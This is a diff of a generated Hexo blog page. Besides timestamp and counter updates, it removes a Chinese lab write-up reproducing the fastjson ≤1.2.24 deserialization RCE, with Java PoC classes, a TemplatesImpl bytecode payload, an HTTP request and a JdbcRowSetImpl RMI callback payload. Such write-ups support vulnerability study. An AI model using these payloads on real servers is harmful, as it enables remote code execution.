@@ -1121,12 +1465,24 @@
                 
               
 
-              <time title="Created: 2019-03-07 00:13:14 / Modified: 13:37:25" itemprop="dateCreated datePublished" datetime="2019-03-07T00:13:14+08:00">2019-03-07</time>
+              <time title="Created: 2019-03-07 00:13:14" itemprop="dateCreated datePublished" datetime="2019-03-07T00:13:14+08:00">2019-03-07</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1357,7 +1713,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-03-07 00:19:27" itemprop="dateModified" datetime="2019-03-07T00:19:27+08:00">2019-03-07</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1554,7 +1910,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-03-22 08:32:58" itemprop="dateModified" datetime="2019-03-22T08:32:58+08:00">2019-03-22</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1736,7 +2092,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-03-22 08:32:27" itemprop="dateModified" datetime="2019-03-22T08:32:27+08:00">2019-03-22</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -1917,7 +2273,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-03-22 08:33:22" itemprop="dateModified" datetime="2019-03-22T08:33:22+08:00">2019-03-22</time>
+                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
               
             
           </span>
@@ -2024,204 +2380,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/fastjson-deserialize/index.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Imagemlt">
-      <meta itemprop="description" content="personal blog">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Image's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/post/fastjson-deserialize/index.html" itemprop="url">
-                  fastjson反序列化复现
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-12-25 23:09:45" itemprop="dateCreated datePublished" datetime="2018-12-25T23:09:45+08:00">2018-12-25</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-04-05 21:31:52" itemprop="dateModified" datetime="2019-04-05T21:31:52+08:00">2019-04-05</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="fastjson反序列化复现"><a href="#fastjson反序列化复现" class="headerlink" title="fastjson反序列化复现"></a>fastjson反序列化复现</h1><p>最近复现一些java方面的漏洞，之前护网杯遇到过一次fastjson反序列化利用的题目，于是这里便从在idea中创建一个maven项目开始复现一下fastjson的反序列化漏洞。</p>
-<p>fastjson反序列化漏洞的主要影响范围是&lt;=1.2.24版本的fastjson。因此，参考<a href="https://blog.csdn.net/zzy1078689276/article/details/78732183/">在IDEA中创建maven项目</a>在创建好maven项目之后，编辑pom.xml加入fastjson需要的dependency：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之后首先编辑ShellExec类,这个类也是反序列化的一个目标类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellExec</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ShellExec</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"mkdir /tmp/imagemlt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ShellExec t = <span class="keyword">new</span> ShellExec();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后便是我们的poc类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alijsondeser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">test_autoTypeDeny</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String fileSeparator = System.getProperty(<span class="string">"file.separator"</span>);</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">"user.dir"</span>) + <span class="string">"/target/classes/com/alijsondeser/ShellExec.class"</span>;</span><br><span class="line">        <span class="comment">//final String evilClassPath = "/tmp/ShellExec.class";</span></span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1,Object.class,config,Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//assertEquals(Model.class, obj.getClass());</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>执行poc，查看目录可以看到已经被执行</p>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225231956222.png" alt="image-20181225231956222"></p>
-<p>生成的payload为：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ="],'_name':'a.b','_tfactory':&#123; &#125;,"_outputProperties":&#123; &#125;,"_name":"a","_version":"1.0","allowedProtocols":"all"&#125;</span><br></pre></td></tr></table></figure>
-<p>web环境下的测试可以使用war包<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a>,从tomcat后台导入。</p>
-<p>之后我们只需要用post方式发包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson-1.0/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2272</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMY29tL2FsaWpzb25kZXNlci9TaGVsbEV4ZWM7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEADlNoZWxsRXhlYy5qYXZhDAAIAAkHAC8MADAAMQEAE21rZGlyIC90bXAvaW1hZ2VtbHQMADIAMwEAGmNvbS9hbGlqc29uZGVzZXIvU2hlbGxFeGVjAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABQADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232621535.png" alt="image-20181225232621535"></p>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/image-20181225232645986.png" alt="image-20181225232645986"></p>
-<p>可以看到文件夹已经被创建且与tomcat运行用户权限相同(root)。</p>
-<p>getshell只需要先wget一个脚本再执行即可。</p>
-<p>关于fastjson反序列化漏洞的发现我们可以让服务器发送请求到我们的公网vps：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://your-ip:1099/Object"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://coding.net/u/ImageMLT/p/blog-images/git/raw/master/A02006C436BC279ED0C41ABF1DE6324E.png" alt="B8F7CB04-3AF7-45AC-BB48-AC90A719741A"></p>
-<p>出现如图的回显即可确认存在反序列化漏洞。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2271,7 +2429,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">57</span>
+                    <span class="site-state-item-count">58</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2314,7 +2472,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">15</span>
+                      
+                    
+                    <span class="site-state-item-count">16</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -2349,7 +2509,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">11</span>
+                      
+                    
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
